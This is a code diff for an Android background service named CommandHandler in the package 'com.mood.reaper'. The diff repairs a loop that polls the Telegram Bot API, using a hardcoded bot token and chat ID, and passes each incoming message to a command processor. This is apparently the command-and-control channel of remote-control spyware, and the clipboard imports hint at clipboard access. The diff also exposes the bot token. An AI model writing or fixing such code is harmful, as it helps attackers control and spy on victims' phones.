@@ -1,21 +1,20 @@
 package com.mood.reaper;
 
-// PASTIkan import yang ini:
-import android.content.ClipboardManager;
-import android.content.ClipData;
-import android.content.Context;
-
 import android.app.Service;
+import android.content.ClipData;
+import android.content.ClipboardManager;
+import android.content.Context;
 import android.content.Intent;
 import android.os.IBinder;
-import com.google.gson.JsonParser;
+
 import okhttp3.*;
+import org.json.JSONArray;
 import org.json.JSONObject;
 
 public class CommandHandler extends Service {
     private static final String BOT_TOKEN = "8322158250:AAENxg_6vudcn_8pjxJhDgZmXIIKsb9kzPU";
     private static final String CHAT_ID = "7678708903";
-    private OkHttpClient client = new OkHttpClient();
+    private final OkHttpClient client = new OkHttpClient();
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
@@ -25,15 +24,22 @@ public class CommandHandler extends Service {
                 try {
                     String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1);
                     Response res = client.newCall(new Request.Builder().url(url).build()).execute();
-                    String json = res.body().string();
-                    JSONObject obj = new JSONObject(json);
+                    
+                    if (res.body() != null) {
+                        String json = res.body().string();
+                        JSONObject obj = new JSONObject(json);
 
-                    if (obj.getBoolean("ok")) {
-                        JSONArray resultArray = obj.getJSONArray("result")) 
-                            JSONObject update = (JSONObject) o;
-                            lastUpdateId = update.getInt("update_id");
-                            String text = update.getJSONObject("message").getString("text");
-                            processCommand(text);
+                        if (obj.optBoolean("ok")) {
+                            JSONArray resultArray = obj.getJSONArray("result");
+                            for (int i = 0; i < resultArray.length(); i++) {
+                                JSONObject update = resultArray.getJSONObject(i);
+                                lastUpdateId = update.getInt("update_id");
+
+                                if (update.has("message") && update.getJSONObject("message").has("text")) {
+                                    String text = update.getJSONObject("message").getString("text");
+                                    processCommand(text);
+                                }
+                            }
                         }
                     }
                     Thread.sleep(2000);
